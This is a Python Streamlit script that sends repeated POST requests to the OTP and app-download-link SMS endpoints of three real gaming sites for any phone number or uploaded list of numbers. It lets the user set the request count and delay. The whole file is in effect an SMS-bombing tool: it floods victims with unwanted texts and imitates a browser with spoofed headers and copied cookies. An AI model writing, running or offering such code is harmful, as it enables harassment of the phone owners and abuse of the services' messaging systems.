import json
import requests
import time
import streamlit as st

st.title("Bulk API Requests with Streamlit")

choice = st.selectbox("Select an Option:", ["Enter Number", "Enter Number List"])

if choice == "Enter Number":
    num = st.text_input("Enter the mobile number:")
    nums = [num] if num else []
else:
    file_name = st.file_uploader("Upload a text file with phone numbers:", type=["txt"])
    if file_name is not None:
        with file_name as f:
            nums = f.readlines()
        nums = [x.strip() for x in nums]

if not nums:
    st.warning("Please enter a mobile number or upload a text file with numbers.")
    st.stop()

req = st.number_input("Enter the number of requests to be sent:", value=1, step=1)
delay = st.slider("Enter the delay in seconds:", 1, 10, 2)

st.write("Performing API requests...")
progress_bar = st.progress(0)

headers = {
    "Sec-Ch-Ua": "\"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json;charset=UTF-8",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Origin": "https://www.a23.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.a23.com/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close",
    "Cookie": "gk-device-id=d63a1653-311c-455f-af75-1d2aa07596ea; _fbp=fb.1.1673762882375.1782639084; _gcl_au=1.1.68582690.1673762882; gk-interaction-id=7b2532c8-d4d5-498d-82f1-669d91314247; _ga=GA1.2.1241468689.1673762883; _gid=GA1.2.66916854.1673762883; _gat_UA-105018979-1=1; _dcmn_p=6IZHY2lkPWdyTjJuV1BEbUVOYmZoazVBeFU; _dcmn_p=6IZHY2lkPWdyTjJuV1BEbUVOYmZoazVBeFU; _dcmn_p=6IZHY2lkPWdyTjJuV1BEbUVOYmZoazVBeFU"
}

url1 = "https://pla23api.a23.com/PlatformService/support/sendApkLink"
data1 = {"channelFor": "APK", "gameType": "A23Games"}

url2 = "https://www.rummycircle.com/api/fl/auth/v3/getOtp"
payload = {
    "deviceId": "e6abe4d3-b210-4a5a-aa99-41a04b3fbd90",
    "deviceName": "",
    "refCode": "",
    "isPlaycircle": False,
}

url3 = "https://www.rummyculture.com/api/user/sendAppDownloadLink"
data = {}

for index, num in enumerate(nums, start=1):
    num = num.strip()
    data1["mobileNumber"] = num
    payload["mobile"] = num
    data["mobile"] = num
    for i in range(req):
        time.sleep(delay)
        response1 = requests.post(url1, headers=headers, json=data1)
        response2 = requests.post(url2, headers=headers, data=json.dumps(payload))
        response3 = requests.post(url3, headers=headers, json=data)

        st.write(f"Request {i+1} for {num}:")
        st.write(f"Response for {url1}: {response1.status_code}")
        st.write(f"Response for {url2}: {response2.status_code}")
        st.write(f"Response for {url3}: {response3.status_code}")

    progress_bar.progress(index / len(nums))

st.success("All requests completed!")




